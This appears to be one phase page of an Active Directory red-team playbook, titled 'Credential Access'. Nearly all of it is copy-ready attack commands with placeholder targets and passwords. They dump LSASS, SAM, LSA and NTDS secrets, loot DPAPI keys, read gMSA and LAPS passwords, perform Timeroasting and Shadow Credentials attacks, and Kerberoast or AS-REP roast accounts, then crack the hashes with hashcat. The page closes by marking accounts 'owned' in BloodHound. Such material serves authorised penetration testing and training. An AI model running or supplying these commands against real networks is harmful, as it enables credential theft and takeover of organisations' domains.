---
id: cred
type: phase
label: "Credential Access"
---


# Credential Access

### Objective
Convert access into credential material: LSASS, SAM/LSA/NTDS, DPAPI, gMSA/LAPS, Timeroast, Shadow Credentials, roasting.

### Exhaustive commands
```bash
# ── LSASS dump (remote) ──────────────────────────────────────────────
nxc smb 10.10.10.5 -u administrator -p 'Password123!' -M lsassy

# ── SAM / LSA / NTDS ─────────────────────────────────────────────────
impacket-secretsdump corp.local/administrator:'Password123!'@10.10.10.5
impacket-secretsdump -just-dc-ntds corp.local/administrator:'Password123!'@10.10.10.5

# ── DPAPI (domain backup key → all users) ────────────────────────────
DonPAPI.py corp.local/administrator:'Password123!'@10.10.10.5
dploot backupkeys -u administrator -p 'Password123!' -d corp.local -t 10.10.10.5

# ── gMSA password read ────────────────────────────────────────────────
nxc ldap dc.corp.local -u lowpriv -p 'Password123!' --gmsa
python3 gMSADumper.py -u lowpriv -p 'Password123!' -d corp.local

# ── LAPS password read ────────────────────────────────────────────────
nxc ldap dc.corp.local -u lowpriv -p 'Password123!' -M laps
bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
  get object 'CN=WS01,CN=Computers,DC=corp,DC=local' --attr ms-Mcs-AdmPwd

# ── Timeroasting (unauthenticated computer hashes) ───────────────────
sudo ./timeroast.py 10.0.10.5 | tee ntp.txt
hashcat -m 31300 ntp.txt rockyou.txt

# ── Shadow Credentials ────────────────────────────────────────────────
python3 pywhisker.py -d corp.local -u attacker -p 'Passw0rd!' \
  --target victim --action add
certipy auth -pfx victim.pfx -dc-ip 10.10.10.5

# ── Kerberoasting / AS-REP ────────────────────────────────────────────
impacket-GetUserSPNs -request -dc-ip 10.10.10.5 \
  corp.local/lowpriv:'Password123!' -outputfile krb.txt
hashcat -m 13100 krb.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

### Exit criteria
Hashes/tickets mapped to principals and **owned** status in BloodHound.

---
